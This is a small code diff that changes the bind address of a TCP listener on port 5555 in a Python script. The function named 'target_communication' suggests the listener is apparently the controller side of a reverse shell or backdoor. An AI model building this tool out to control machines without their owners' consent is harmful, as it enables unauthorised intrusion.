@@ -83,7 +83,7 @@ def target_communication():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('102.168.122.121', 5555))
+sock.bind(('192.168.1.131', 5555))
 print(colored('[0_0] Listening...', 'green'))
 sock.listen(5)
 
